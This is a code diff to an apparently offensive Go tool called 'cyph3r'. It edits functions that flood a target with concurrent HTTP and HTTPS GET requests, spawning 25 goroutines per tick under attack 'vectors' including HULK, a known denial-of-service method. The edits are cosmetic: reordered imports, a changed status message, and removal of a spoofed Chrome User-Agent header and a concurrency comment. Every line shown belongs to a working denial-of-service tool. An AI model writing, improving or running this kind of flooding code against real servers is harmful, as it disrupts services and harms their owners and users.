@@ -6,8 +6,9 @@ import (
 	"net"
 	"net/http"
 	"time"
-	"github.com/AnonPhoenix420/cyph3r/internal/output"
+
 	"github.com/AnonPhoenix420/cyph3r/internal/models"
+	"github.com/AnonPhoenix420/cyph3r/internal/output"
 )
 
 func RunTacticalTest(cfg models.TacticalConfig, ctx context.Context) {
@@ -19,10 +20,9 @@ func RunTacticalTest(cfg models.TacticalConfig, ctx context.Context) {
 	for {
 		select {
 		case <-ctx.Done():
-			fmt.Printf("\n%s[+] Mission vectors collapsed safely.%s\n", output.NeonGreen, output.Reset)
+			fmt.Printf("\n%s[+] Mission complete.%s\n", output.NeonGreen, output.Reset)
 			return
 		case <-ticker.C:
-			// High Concurrency: 25 workers per PPS tick
 			for i := 0; i < 25; i++ { 
 				go executeVector(cfg)
 			}
@@ -35,11 +35,10 @@ func executeVector(cfg models.TacticalConfig) {
 
 	switch cfg.Vector {
 	case "HULK", "HTTPS", "HTTP":
+		client := &http.Client{Timeout: 1 * time.Second}
 		protocol := "https://"
 		if cfg.Vector == "HTTP" { protocol = "http://" }
-		client := &http.Client{Timeout: 1 * time.Second}
 		req, _ := http.NewRequest("GET", protocol+addr, nil)
-		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
 		resp, err := client.Do(req)
 		if err == nil { resp.Body.Close() }
 
